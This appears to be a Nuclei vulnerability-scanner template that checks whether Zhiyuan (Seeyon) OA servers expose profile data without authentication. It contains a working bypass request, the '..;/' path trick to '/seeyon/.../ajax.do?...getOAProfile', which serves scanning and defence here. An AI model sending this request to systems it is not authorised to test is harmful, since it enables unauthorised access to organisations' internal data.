id: zhiyuan-oa-unauthorized

info:
  name: Zhiyuan Oa Unauthorized
  author: pikpikcu
  severity: low
  description: Zhiyuan Oa is exposed.
  reference:
    - https://buaq.net/go-53721.html
  classification:
    cpe: cpe:2.3:a:zhiyuan:zhiyuan:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: zhiyuan
    product: zhiyuan
  tags: seeyon,unauth,zhiyuan,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"

    matchers-condition: and
    matchers:
      - type: word
        name: zhiyuan
        cpe: cpe:2.3:a:zhiyuan:zhiyuan:*:*:*:*:*:*:*:*
        words:
          - "serverIdentifier"
          - "companyName"
        condition: and

      - type: word
        name: zhiyuan-2
        cpe: cpe:2.3:a:zhiyuan:zhiyuan:*:*:*:*:*:*:*:*
        words:
          - "application/json"
        part: header

      - type: status
        status:
          - 200
